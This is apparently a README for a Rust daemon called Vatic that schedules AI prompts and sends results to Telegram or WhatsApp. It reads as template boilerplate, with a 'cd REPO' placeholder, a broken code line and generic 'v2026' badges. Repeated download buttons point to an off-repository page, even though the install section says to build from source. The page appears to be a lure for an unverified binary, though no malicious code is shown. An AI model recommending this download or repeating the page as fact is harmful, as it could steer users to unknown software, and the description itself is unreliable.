# Vatic v2026 - AI prompt scheduler 2026

> **Vatic is a Rust daemon for scheduling and running AI prompts, with TOML-driven setup, container isolation, and delivery via channels such as Telegram and WhatsApp.**

[![Platform](https://img.shields.io/badge/Platform-Rust%20daemon-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/tommillergsh9791/vatic-prompt-container-hub?style=flat-square)](https://github.com/tommillergsh9791/vatic-prompt-container-hub)

---

<p align="center">
  <a href="https://tommillergsh9791.github.io/vatic-prompt-container-hub/">
    <img src="https://img.shields.io/badge/Download-Vatic%20Latest-brightgreen?style=for-the-badge" alt="Download Vatic">
  </a>
</p>

> **[Direct Download - Vatic v2026](https://tommillergsh9791.github.io/vatic-prompt-container-hub/)**

---

[Download Latest Build](https://tommillergsh9791.github.io/vatic-prompt-container-hub/)

---

## Overview

Vatic is made for situations where AI prompts should execute on a timetable rather than being triggered manually every time. It runs as a Rust daemon, which suits automated setups that need reliable timing and simple control over when prompts are launched.

Its workflow is built around configuration. Using TOML as the primary format, Vatic provides a single place to define jobs, container behavior, and delivery routes. That makes it a practical option for people or teams who want prompt execution to follow repeatable rules and messaging outputs.

---

## What it does

- Run AI prompts either immediately or on a schedule
- Configure daemon behavior with TOML files
- Execute tasks in isolated containers
- Deliver results or notifications through messaging channels
- Connect with Telegram for message delivery
- Connect with WhatsApp for message delivery
- Operate as a Rust-based background service
- Support automated prompt workflows with little manual intervention

---

## Installation

Clone the repository and compile it from source in your Rust setup:

- `git clone https://github.com/tommillergsh9791/vatic-prompt-container-hub.git
- `cd REPO`
- `cargo build --release`

Once the build finishes, start the daemon from the generated binary and supply your TOML configuration file path.

---

## Usage

A common setup is to define when prompts should run, select how they execute, and route any output to the messaging channel you prefer.

Example flow:

1. Create or update the TOML config.
2. Add the prompt job you want to execute.
3. Turn on isolated container handling if it is required.
4. Set up Telegram or WhatsApp delivery.
5. Launch the daemon and allow it to process the schedule.

Depending on how you deploy it, Vatic can run as a service or be started directly from the binary during setup and testing.

---

## Configuration

Vatic relies on TOML for its main settings. The config file is where you define scheduling rules, container options, and messaging preferences.

Example structure:

- `schedule` for when prompts should run
- `container` for isolated execution settings
- `channels.telegram` for Telegram delivery
- `channels.whatsapp` for WhatsApp delivery

Place the file where the daemon can access it at startup, then pass that path when launching Vatic.

---

## Requirements

- Rust runtime and build tooling
- A system capable of running a Rust daemon
- TOML configuration support
- Optional container runtime for isolated execution
- Network access for Telegram or WhatsApp messaging integrations

---

## FAQ

**How do I update Vatic?**  
Fetch the latest source changes, rebuild the project, and redeploy the daemon with your existing configuration.

**Where are the settings stored?**  
Vatic uses TOML for configuration, so the primary options live in the config file you provide at startup.

**Can I use it without messaging channels?**  
Yes. The core behavior is scheduling and running prompts. Messaging integrations are there when you want to send output onward.

**What should I check if a job does not run?**  
Inspect the TOML schedule, make sure the daemon is active, and verify any container or channel settings associated with that job.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
